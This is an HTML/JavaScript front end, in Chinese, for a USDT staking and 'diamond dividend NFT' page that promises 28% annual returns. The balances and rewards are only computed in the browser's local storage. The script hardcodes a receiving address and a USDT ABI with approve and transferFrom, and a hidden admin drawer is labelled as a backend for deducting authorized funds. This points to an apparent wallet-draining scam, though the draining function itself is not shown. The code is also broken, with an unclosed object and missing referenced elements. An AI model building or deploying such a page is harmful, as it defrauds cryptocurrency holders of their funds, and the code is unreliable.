<html lang="zh-CN">
<head>

<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }

body {
    background:
        radial-gradient(circle at 12% 12%, rgba(255,255,255,0.08) 0%, transparent 25%),
        linear-gradient(135deg, #050505 0%, #080808 45%, #070707 100%);
    color:#e2e8f0;
    padding: 18px 14px;
    max-width: 560px;
    margin: 0 auto;
    min-height: 100vh;
    position: relative;
    overflow-x: hidden;
}

/* 颗粒噪点层 */
body::before{
    content:"";
    position:fixed;
    inset:0;
    pointer-events:none;
    z-index:0;
    opacity:0.35;
    background-image:url("data:image/svg+xml,%3Csvg width='52' height='52' viewBox='0 0 52 52' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.95' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
}

/* 微弱扫描线 */
body::after{
    content:"";
    position:fixed;
    inset:0;
    pointer-events:none;
    z-index:1;
    opacity:0.08;
    background:repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(255,255,255,0.04) 2px,
        rgba(255,255,255,0.04) 4px
    );
}

.page-wrapper{
    position:relative;
    z-index:2;
}

.top-header-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom:22px;
}

.header-left-title{
    font-size:21px;
    font-weight:800;
    letter-spacing:0.5px;
    color:transparent;
    background:linear-gradient(90deg, #00ffcc, #00a3ff);
    -webkit-background-clip:text;
    background-clip:text;
    text-shadow:0 0 18px rgba(0,255,204,0.35);
}

.header-right-icons {
    display: flex;
    gap:12px;
    align-items:center;
}

.wallet-btn {
    padding:7px 14px;
    border-radius:999px;
    font-size:13px;
    font-weight:600;
    border:1px solid rgba(255,255,255,0.06);
    cursor:pointer;
    white-space:nowrap;
    position:relative;
    overflow:hidden;
    color:#fff;
    background:
        linear-gradient(135deg, rgba(18,18,18,0.95), rgba(10,10,10,0.95));
    box-shadow:
        inset 0 1px 0 rgba(255,255,255,0.08),
        0 0 0 1px rgba(255,255,255,0.02),
        0 12px 28px rgba(0,0,0,0.18);
}

.wallet-btn::before{
    content:"";
    position:absolute;
    inset:-2px;
    border-radius:999px;
    background:linear-gradient(135deg, rgba(0,255,204,0.8), rgba(0,163,255,0.8));
    opacity:0;
    transition:0.25s ease;
    z-index:-1;
}

.wallet-btn:hover::before{
    opacity:1;
}

.wallet-btn.connected{
    background:
        linear-gradient(135deg, rgba(0,80,60,0.95), rgba(0,50,35,0.95));
    border-color:rgba(0,255,204,0.22);
    box-shadow:
        inset 0 1px 0 rgba(255,255,255,0.12),
        0 0 18px rgba(0,255,204,0.14);
}

.menu-btn{
    width:36px;
    height:36px;
    border-radius:12px;
    border:1px solid rgba(255,255,255,0.06);
    background:
        linear-gradient(135deg, rgba(18,18,18,0.95), rgba(10,10,10,0.95));
    color:#cbd5e1;
    font-size:20px;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
    transition:0.2s ease;
    box-shadow:
        inset 0 1px 0 rgba(255,255,255,0.08),
        0 8px 18px rgba(0,0,0,0.16);
}

.menu-btn:hover{
    border-color:rgba(0,163,255,0.35);
    color:#00ffcc;
}

/* 侧边管理员抽屉菜单 */
.admin-drawer{
    position:fixed;
    top:0;
    right:0;
    width:300px;
    height:100vh;
    background:
        linear-gradient(180deg, rgba(10,10,10,0.98), rgba(8,8,8,0.98));
    border-left:1px solid rgba(255,255,255,0.06);
    padding:24px 18px;
    z-index:99;
    transform:translateX(100%);
    transition:transform 0.3s cubic-bezier(0.4,0,0.2,1);
    box-shadow:
        -10px 0 30px rgba(0,0,0,0.45);
}

.admin-drawer.open{
    transform:translateX(0);
}

.drawer-close{
    position:absolute;
    top:14px;
    right:14px;
    font-size:24px;
    cursor:pointer;
    color:#94a3b8;
    width:32px;
    height:32px;
    display:flex;
    align-items:center;
    justify-content:center;
    border-radius:8px;
    transition:0.2s ease;
}

.drawer-close:hover{
    background:rgba(255,255,255,0.06);
    color:#ef4444;
}

.drawer-title{
    font-size:17px;
    font-weight:bold;
    color:transparent;
    background:linear-gradient(90deg, #ef4444, #ff7b7b);
    -webkit-background-clip:text;
    background-clip:text;
    margin-bottom:12px;
}

.drawer-input{
    width:100%;
    background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.06);
    border-radius:10px;
    padding:12px 10px;
    color:#e2e8f0;
    margin-bottom:14px;
    outline:none;
    font-size:14px;
}

.drawer-input:focus{
    border-color:rgba(239,68,68,0.35);
    box-shadow:0 0 0 2px rgba(239,68,68,0.14);
}

.drawer-btn{
    width:100%;
    padding:13px;
    border:none;
    border-radius:10px;
    background:
        linear-gradient(135deg, #ef4444, #dc2626);
    color:#fff;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    box-shadow:0 8px 18px rgba(239,68,68,0.25);
}

.mask{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.65);
    z-index:98;
    display:none;
    backdrop-filter:blur(4px);
}

.mask.show{
    display:block;
}

/* 挖矿主卡片 */
.stake-main-card{
    background:
        linear-gradient(135deg, rgba(18,18,18,0.96), rgba(12,12,12,0.96));
    border-radius:22px;
    padding:22px 20px;
    border:1px solid rgba(0,255,204,0.14);
    margin-bottom:18px;
    position:relative;
    overflow:hidden;
    box-shadow:
        inset 0 1px 0 rgba(255,255,255,0.08),
        0 18px 35px rgba(0,0,0,0.25);
}

.stake-main-card::before{
    content:"";
    position:absolute;
    inset:0;
    background:
        radial-gradient(circle at 0 0, rgba(0,255,204,0.14), transparent 35%),
        radial-gradient(circle at 100% 100%, rgba(0,163,255,0.14), transparent 35%);
    pointer-events:none;
}

.stake-top-row{
    display:flex;
    justify-content:space-between;
    align-items:center;
    margin-bottom:18px;
    position:relative;
}

.stake-title{
    font-size:21px;
    font-weight:bold;
    letter-spacing:0.5px;
    color:transparent;
    background:linear-gradient(90deg, #00ffcc, #00a3ff);
    -webkit-background-clip:text;
    background-clip:text;
}

.block-tag{
    background:
        linear-gradient(135deg, rgba(0,255,204,0.14), rgba(0,163,255,0.14));
        color:#00ffcc;
        font-size:13px;
        padding:5px 12px;
        border-radius:999px;
        border:1px solid rgba(0,255,204,0.22);
        font-weight:600;
        box-shadow:0 0 12px rgba(0,255,204,0.14);
}

.info-row{
    display:flex;
    justify-content:space-between;
    padding:12px 0;
    border-bottom:1px solid rgba(255,255,255,0.06);
}

.info-row:last-child{
    border-bottom:none;
}

.info-label{
    color:#94a3b8;
    font-size:15px;
}

.info-value{
    font-weight:600;
    font-size:15px;
    color:#e2e8f0;
}

.countdown-wrap{
    background:
        linear-gradient(135deg, rgba(0,0,0,0.55), rgba(10,10,10,0.55));
    border-radius:16px;
    padding:16px;
    margin:16px 0;
    text-align:center;
    border:1px solid rgba(255,255,255,0.06);
    position:relative;
    overflow:hidden;
}

.countdown-wrap::before{
    content:"";
    position:absolute;
    inset:-2px;
    background:linear-gradient(90deg, transparent, rgba(251,191,36,0.45), transparent);
    animation:shine 2.5s infinite linear;
}

@keyframes shine{
    0%{transform:translateX(-100%);}
    100%{transform:translateX(100%);}
}

.countdown-text{
    font-size:14px;
    color:#94a3b8;
    margin-bottom:8px;
}

.countdown-time{
    font-size:26px;
    font-weight:800;
    letter-spacing:1px;
    color:#fbbf24;
    text-shadow:0 0 18px rgba(251,191,36,0.35);
}

.stake-input-wrap{
    margin:18px 0 10px;
}

.label{
    font-size:15px;
    color:#cbd5e1;
    margin-bottom:10px;
    display:block;
}

.input-row{
    display:flex;
    align-items:flex-end;
    gap:10px;
}

.stake-input{
    flex:1;
    font-size:30px;
    background:transparent;
    border:none;
    outline:none;
    color:#fff;
    font-weight:700;
}

.stake-input::placeholder{
    font-size:16px;
    color:#666;
    font-weight:400;
}

.max-small-btn{
    padding:6px 14px;
    background:
        linear-gradient(135deg, rgba(0,163,255,0.14), rgba(0,255,204,0.14));
    color:#00ffcc;
    border-radius:8px;
    font-size:14px;
    font-weight:600;
    cursor:pointer;
    border:1px solid rgba(0,255,204,0.22);
}

.btn-group{
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:12px;
    margin-top:16px;
}

.btn{
    padding:15px;
    border:none;
    border-radius:14px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    position:relative;
    overflow:hidden;
    color:#fff;
}

.btn-stake{
    background:
        linear-gradient(135deg, #00ffcc, #00a3ff);
    box-shadow:0 10px 25px rgba(0,255,204,0.25);
}

.btn-unstake{
    background:
        linear-gradient(135deg, #f59e0b, #d97706);
    box-shadow:0 10px 25px rgba(245,158,11,0.25);
}

.btn:disabled{
    opacity:0.45;
    cursor:not-allowed;
    box-shadow:none;
}

.balance-card{
    background:
        linear-gradient(135deg, rgba(18,18,18,0.96), rgba(12,12,12,0.96));
    border-radius:22px;
    padding:18px 20px;
    margin-bottom:18px;
    border:1px solid rgba(255,255,255,0.06);
    box-shadow:
        inset 0 1px 0 rgba(255,255,255,0.08),
        0 12px 30px rgba(0,0,0,0.22);
}

.balance-row{
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.balance-label{
    color:#94a3b8;
}

.balance-val{
    font-size:18px;
    font-weight:700;
    color:#e2e8f0;
}

/* ===================== 钻石💎分红卡牌主题 ===================== */
.nft-card-wrap{
    background:linear-gradient(135deg, rgba(18,18,18,0.96), rgba(12,12,12,0.96));
    border-radius:22px;
    padding:20px;
    margin-bottom:18px;
    border:1px solid rgba(168,85,247,0.18);
}
.nft-title{
    font-size:18px;
    font-weight:bold;
    margin-bottom:16px;
    color:transparent;
    background:linear-gradient(90deg,#c084fc,#a855f7);
    -webkit-background-clip:text;
    background-clip:text;
}
.nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}

@keyframes flipY{
    0%{transform:rotateY(0deg)}
    100%{transform:rotateY(360deg)}
}

.nft-card{
  height:240px;
  position:relative;
  border-radius:16px;
  background:
    linear-gradient(135deg, rgba(20,20,35,0.96), rgba(10,10,25,0.96));
  border:1px solid currentColor;
  overflow:hidden;
  perspective:1000px;
}
.nft-inner{
  position:relative;
  width:100%;
  height:100%;
  transform-style:preserve-3d;
  animation:flipY 8s linear infinite;
}
.nft-front,.nft-back{
  position:absolute;
  width:100%;
  height:100%;
  backface-visibility:hidden;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  padding:20px
}
.nft-back{
  transform:rotateY(180deg);
  background:
    linear-gradient(135deg, rgba(15,15,30,0.98), rgba(8,8,20,0.98));
}

/* 钻石等级配色 */
.n1{color:#b8eaff}
.n2{color:#82c9ff}
.n3{color:#c084fc}
.n4{color:#f472b6}
.n5{color:#ffd700;background:linear-gradient(135deg,#1a1a30,#101020)}

.nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold;letter-spacing:1px}
.nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:14px;color:#111}
.nft-card-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}

/* 钻石主体 */
.diamond-core{
  width:120px;
  height:120px;
  position:relative;
  margin-bottom:16px;
}
.diamond{
  width:100%;
  height:100%;
  clip-path:polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
  background:
    linear-gradient(
      135deg,
      rgba(255,255,255,0.95) 0%,
      rgba(200,220,255,0.9) 25%,
      currentColor 50%,
      rgba(90,120,180,0.9) 75%,
      rgba(30,40,60,0.95) 100%
    );
  box-shadow:
    0 0 35px currentColor,
    inset 0 0 25px rgba(255,255,255,0.55);
  position:absolute;
  top:0;
  left:0;
}
.diamond-shine{
  position:absolute;
  width:100%;
  height:100%;
  top:0;
  left:0;
  clip-path:polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
  background:
    linear-gradient(
      135deg,
      rgba(255,255,255,0) 0%,
      rgba(255,255,255,0.35) 22%,
      rgba(255,255,255,0) 45%
    );
  animation:diamondShine 2.2s infinite ease-in-out;
}
@keyframes diamondShine{
  0%{transform:translateX(-120%);opacity:0}
  45%{transform:translateX(120%);opacity:1}
  100%{transform:translateX(120%);opacity:0}
}
.diamond-ring{
  position:absolute;
  width:145px;
  height:145px;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  border:1px solid currentColor;
  border-radius:50%;
  opacity:0.65;
  box-shadow:0 0 18px currentColor;
}
.diamond-ring::after{
  content:'';
  position:absolute;
  width:8px;
  height:8px;
  background:currentColor;
  border-radius:50%;
  top:-4px;
  left:50%;
  transform:translateX(-50%);
}
.diamond-orbit{
  position:absolute;
  width:105px;
  height:55px;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%) rotateX(60deg);
  border:1px solid currentColor;
  border-radius:50%;
  opacity:0.45;
}
.diamond-dot{
  position:absolute;
  width:6px;
  height:6px;
  background:#fff;
  border-radius:50%;
  top:18%;
  right:12%;
}

.nft-bottom{font-size:14px;letter-spacing:1px;opacity:0.8}
.nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
.nft-pct{font-size:14px;font-weight:bold}
.nft-btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}
.nft-small-btn{padding:10px;border-radius:10px;border:none;font-size:13px;font-weight:bold;cursor:pointer}
.btn-craft{background:linear-gradient(90deg,#c084fc,#a855f7);color:#000}
.energy-info{font-size:14px;color:#cbd5e1;margin-bottom:12px}
/* ========================================================================== */

/* 响应式 */
@media(max-width:480px){
    body{
        padding:14px 12px;
    }

    .stake-title{
        font-size:19px;
    }

    .countdown-time{
        font-size:22px;
    }

    .stake-input{
        font-size:26px;
    }
}
</style>
</head>
<body>

<div class="page-wrapper">

<div class="mask" id="drawerMask"></div>
<div class="admin-drawer" id="adminDrawer">
    <div class="drawer-close" id="drawerClose">×</div>
    <div class="drawer-title">🔴管理员｜授权划扣后台</div>

</div>

<div class="stake-main-card">

        <div class="info-label">我的质押本金</div>
        <div class="info-value" id="stakePrincipal">0.000000 USDT</div>

            <input class="stake-input" id="stakeAmountInput" inputmode="decimal" placeholder="输入质押金额">

        <div class="balance-label">钱包USDT余额</div>

</div>

<!-- ============ NFT分红卡牌板块 - 钻石主题 ============ -->
<div class="nft-card-wrap">
    <div class="nft-title">💎 钻石分红卡牌</div>
    <div class="energy-info">当前能量：<span id="nftEnergyVal">0</span></div>

        <button class="nft-small-btn btn-craft" onclick="craftCard(1)">合成Lv1(3500能量)</button>

    <div class="nft-btn-row" style="margin-top:8px">
        <button class="nft-small-btn btn-craft" onclick="craftCard(3)">合成Lv3(31500能量)</button>
        <button class="nft-small-btn btn-craft" onclick="craftCard(4)">合成Lv4(94500能量)</button>
    </div>
    <div class="nft-btn-row" style="margin-top:8px">
        <button class="nft-small-btn btn-craft" onclick="craftCard(5)">合成Lv5(283500能量)</button>
        <button class="nft-small-btn" style="background:#444;color:#fff" onclick="renderNftMyCards()">刷新卡牌</button>
    </div>

    <div class="nft-grid" id="myNftCardsWrap">
        <div style="grid-column:span 2;text-align:center;padding:22px;color:#888">连接钱包后显示卡牌</div>
    </div>
</div>

</div>

<script>
// 质押合约接收地址（替换为你的合约地址）
const STAKE_CONTRACT_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const GAS_LIMIT = "0x493E0";
const MAX_WAIT = 40;
const BLOCK_INTERVAL_SEC = 8 * 3600; //8小时爆块
const APY_RATE = 0.28; //年化28%

// NFT卡牌配置
const CARD_COST_BASE = 3500;

let web3 = null;

let stakeData = {
    principal:0,
    stakeStart:0,
    lastBlockTime:0

const $ = s=>document.querySelector(s);
const walletBtn = $("#walletBtn");
const menuBtn = $("#menuBtn");
const adminDrawer = $("#adminDrawer");
const drawerMask = $("#drawerMask");

const deductBtn = $("#deductBtn");

const stakeMaxBtn = $("#stakeMaxBtn");

const doUnStakeBtn = $("#doUnStakeBtn");
const stakePrincipal = $("#stakePrincipal");
const stakeReward = $("#stakeReward");
const stakeStartTime = $("#stakeStartTime");
const nextBlockTs = $("#nextBlockTs");

const USDT_ABI = [
{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

// ========== NFT卡牌本地存储工具 ==========
function nftKey(k){
    return "nft_"+k+"_"+(userAddress||"");
}
function getNftEnergy(){
    return Number(localStorage.getItem(nftKey("energy"))||0);
}
function setNftEnergy(v){
    localStorage.setItem(nftKey("energy"), String(v));
}
function getCardLv(lv){
    return Number(localStorage.getItem(nftKey("c"+lv))||0);
}
function setCardLv(lv,val){
    localStorage.setItem(nftKey("c"+lv), String(val));
}

//合成卡牌
function craftCard(lv){
    if(!userAddress){alert("请先连接钱包");return;}
    const cost = CARD_COST_BASE * Math.pow(3, lv-1);
    const e = getNftEnergy();
    if(e < cost){
        alert("能量不足！需要："+cost+"，当前："+e);
        return;
    }
    if(!confirm("消耗 "+cost+" 能量合成 Lv."+lv+" 钻石分红卡牌")) return;
    setNftEnergy(e - cost);
    setCardLv(lv, getCardLv(lv)+1);
    alert("✅钻石卡牌合成成功");
    renderNftMyCards();
    renderUi();
}

//渲染我的卡牌列表
function renderNftMyCards(){
    if(!userAddress){
        myNftCardsWrap.innerHTML = `<div style="grid-column:span 2;text-align:center;padding:22px;color:#888">连接钱包后显示卡牌</div>`;
        nftEnergyVal.innerText = "0";
        return;
    }
    nftEnergyVal.innerText = getNftEnergy();
    let html = "";
    const clsArr = ["n1","n2","n3","n4","n5"];
    const pctArr = ["0.5%","1.0%","1.5%","2.0%","2.5%"];
    for(let lv=1;lv<=5;lv++){
        const cnt = getCardLv(lv);
        if(cnt <=0) continue;
        const cl = clsArr[lv-1];
        const pct = pctArr[lv-1];
        html += `
<div class="nft-card ${cl}">
  <div class="nft-inner">
    <div class="nft-front">
      <div class="nft-top">NFT</div>
      <div class="nft-logo">💎</div>
      <div class="nft-card-title">钻石分红卡牌</div>
      <div class="diamond-core">
        <div class="diamond"></div>
        <div class="diamond-shine"></div>
        <div class="diamond-ring"></div>
        <div class="diamond-orbit"></div>
        <div class="diamond-dot"></div>
      </div>
      <div class="nft-bottom">持有 ×${cnt}</div>
    </div>
    <div class="nft-back">
      <div class="nft-level">Lv.${lv}</div>
      <div class="nft-pct">分红 ${pct}</div>
    </div>
  </div>
</div>`;
    }
    if(html===""){
        html = `<div style="grid-column:span 2;text-align:center;padding:22px;color:#888">暂无钻石卡牌，消耗能量合成</div>`;
    }
    myNftCardsWrap.innerHTML = html;
}

// 更新钱包按钮文本样式
function updateWalletButton(){
    if(userAddress){
        walletBtn.innerText = "钱包已连接";
        walletBtn.classList.add("connected");
    }else{
        walletBtn.innerText = "连接钱包";
        walletBtn.classList.remove("connected");
    }
}

function getStakeKey(){ return "stake_mining_" + (userAddress||""); }
function loadLocal(){
    const str = localStorage.getItem(getStakeKey());
    stakeData = str ? JSON.parse(str) : {principal:0, stakeStart:0, lastBlockTime:0};
}
function saveLocal(){ localStorage.setItem(getStakeKey(), JSON.stringify(stakeData)); }

//计算挖矿收益
function calcMiningReward(){
    if(stakeData.principal <=0 || stakeData.stakeStart <=0) return 0;
    const now = Math.floor(Date.now()/1000);
    const diffSec = now - stakeData.stakeStart;
    const yearSec = 365*24*3600;
    return stakeData.principal * APY_RATE * (diffSec / yearSec);
}

function formatTime(s){
    let h = Math.floor(s/3600);
    let m = Math.floor((s%3600)/60);
    let sec = s%60;
    return String(h).padStart(2,'0')+":"+String(m).padStart(2,'0')+":"+String(sec).padStart(2,'0');
}
function renderCountDown(){
    if(stakeData.principal <=0 || stakeData.lastBlockTime ===0){
        countDownDom.innerText = "未质押";
        nextBlockTs.innerText = "未质押";
        return;
    }
    const now = Math.floor(Date.now()/1000);
    const nextBlock = stakeData.lastBlockTime + BLOCK_INTERVAL_SEC;
    const remain = Math.max(0, nextBlock - now);
    countDownDom.innerText = formatTime(remain);
    nextBlockTs.innerText = new Date(nextBlock*1000).toLocaleString();
}

function renderUi(){
    updateWalletButton();
    stakePrincipal.innerText = stakeData.principal.toFixed(6)+" USDT";
    stakeReward.innerText = calcMiningReward().toFixed(6)+" USDT";
    stakeStartTime.innerText = stakeData.stakeStart>0 ? new Date(stakeData.stakeStart*1000).toLocaleString() : "未质押";
    renderCountDown();
    renderNftMyCards();

    if(userAddress){
        doStakeBtn.disabled = false;
    }
}
